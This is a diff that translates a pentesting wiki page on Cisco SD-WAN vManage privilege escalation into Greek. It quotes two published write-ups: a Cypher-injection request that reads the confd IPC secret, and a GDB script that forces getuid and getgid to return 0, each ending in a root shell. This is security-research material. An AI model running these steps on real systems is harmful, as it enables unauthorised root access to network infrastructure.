@@ -4,18 +4,15 @@
 
 ## Path 1
 
-(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+(Παράδειγμα από [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
-
+Μετά από λίγο ψάξιμο σε κάποια [documentation](http://66.218.245.39/doc/html/rn03re18.html) που σχετίζεται με το `confd` και τα διάφορα binaries (προσβάσιμα με έναν λογαριασμό στην ιστοσελίδα της Cisco), βρήκαμε ότι για να αυθεντικοποιήσει το IPC socket, χρησιμοποιεί ένα μυστικό που βρίσκεται στο `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-
-Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
-
+Θυμάστε την εγκατάσταση Neo4j; Εκτελείται με τα δικαιώματα του χρήστη `vmanage`, επιτρέποντάς μας να ανακτήσουμε το αρχείο χρησιμοποιώντας την προηγούμενη ευπάθεια:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -27,9 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-
-The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
-
+Το πρόγραμμα `confd_cli` δεν υποστηρίζει παραμέτρους γραμμής εντολών αλλά καλεί το `/usr/bin/confd_cli_user` με παραμέτρους. Έτσι, θα μπορούσαμε να καλέσουμε απευθείας το `/usr/bin/confd_cli_user` με το δικό μας σύνολο παραμέτρων. Ωστόσο, δεν είναι αναγνώσιμο με τα τρέχοντα δικαιώματά μας, οπότε πρέπει να το ανακτήσουμε από το rootfs και να το αντιγράψουμε χρησιμοποιώντας scp, να διαβάσουμε τη βοήθεια και να το χρησιμοποιήσουμε για να αποκτήσουμε πρόσβαση στο shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -47,15 +42,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
 ## Path 2
 
 (Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.
+Το blog¹ της ομάδας synacktiv περιέγραψε έναν κομψό τρόπο για να αποκτήσετε ένα root shell, αλλά η προϋπόθεση είναι ότι απαιτεί να αποκτήσετε ένα αντίγραφο του `/usr/bin/confd_cli_user` το οποίο είναι αναγνώσιμο μόνο από τον root. Βρήκα έναν άλλο τρόπο για να αναβαθμίσω σε root χωρίς τέτοια ταλαιπωρία.
 
-When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
-
+Όταν αποσυναρμολόγησα το δυαδικό αρχείο `/usr/bin/confd_cli`, παρατήρησα τα εξής:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -84,46 +77,40 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-
-When I run “ps aux”, I observed the following (_note -g 100 -u 107_)
-
+Όταν εκτελώ το “ps aux”, παρατήρησα τα εξής (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
+Υπέθεσα ότι το πρόγραμμα “confd_cli” περνά το αναγνωριστικό χρήστη και το αναγνωριστικό ομάδας που συνέλεξε από τον συνδεδεμένο χρήστη στην εφαρμογή “cmdptywrapper”.
 
-I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+Η πρώτη μου προσπάθεια ήταν να εκτελέσω το “cmdptywrapper” απευθείας και να του παρέχω `-g 0 -u 0`, αλλά απέτυχε. Φαίνεται ότι δημιουργήθηκε ένας περιγραφέας αρχείου (-i 1015) κάπου στη διαδικασία και δεν μπορώ να τον προσποιηθώ.
 
-My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
+Όπως αναφέρθηκε στο blog της synacktiv (τελευταίο παράδειγμα), το πρόγραμμα `confd_cli` δεν υποστηρίζει παραμέτρους γραμμής εντολών, αλλά μπορώ να το επηρεάσω με έναν αποσφαλματωτή και ευτυχώς το GDB περιλαμβάνεται στο σύστημα.
 
-As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
-
-I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
+Δημιούργησα ένα σενάριο GDB όπου ανάγκαζα το API `getuid` και `getgid` να επιστρέφει 0. Δεδομένου ότι ήδη έχω δικαιώματα “vmanage” μέσω της αποσυμπίεσης RCE, έχω άδεια να διαβάσω το `/etc/confd/confd_ipc_secret` απευθείας.
 
 root.gdb:
-
 ```
 set environment USER=root
 define root
-   finish
-   set $rax=0
-   continue
+finish
+set $rax=0
+continue
 end
 break getuid
 commands
-   root
+root
 end
 break getgid
 commands
-   root
+root
 end
 run
 ```
-
-Console Output:
-
+Κονσόλα Έξοδος:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -157,5 +144,4 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
